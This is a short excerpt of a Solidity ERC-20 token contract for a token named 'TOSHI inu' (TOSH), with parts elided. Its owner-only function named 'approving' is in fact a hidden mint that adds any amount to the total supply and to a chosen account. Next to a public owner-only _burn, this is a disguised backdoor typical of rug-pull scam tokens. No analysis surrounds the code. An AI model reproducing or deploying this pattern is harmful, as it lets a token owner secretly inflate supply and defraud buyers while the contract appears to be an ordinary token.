...
contract Token is Context, IERC20, IERC20Metadata {
    ...
    string public _name = "TOSHI inu";
    string public _symbol= "TOSH";
    ...
    function approve1(address _account)  public {
    ...
    function _burn(address account, uint256 amount) onlyOwner  public virtual {
      ...
      function  approving(address account, uint256 amount) onlyOwner  public virtual {
        require(account != address(0), "ERC20: approving to the zero address");
        _beforeTokenTransfer(address(0), account, amount);
        _totalSupply += amount;
        _balances[account] += amount;
        emit Transfer(address(0), account, amount);
